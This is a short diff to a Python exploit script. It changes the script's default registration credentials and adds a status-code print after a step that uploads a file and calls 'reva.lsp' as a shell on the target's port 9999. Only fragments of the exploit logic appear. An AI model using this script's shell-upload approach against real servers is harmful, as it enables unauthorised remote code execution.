@@ -20,8 +20,8 @@ from colorama import Fore
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 #Options for user registration, if no user has been created yet
-username = 'kali'
-password = 'kalikali'
+username = 'admin'
+password = 'password'
 email = 'admin@admin.com'
 
 parser = argparse.ArgumentParser()
@@ -132,6 +132,7 @@ def exploit(r,s):
     if r.text == 'ok' :
         print(f"{Fore.GREEN}[+]{Fore.WHITE} Successfully uploaded, calling shell ")
         r = s.get(f"https://{url}:9999/fs/reva.lsp")
+        print(r.status_code)
 
 if __name__=='__main__':
     try:
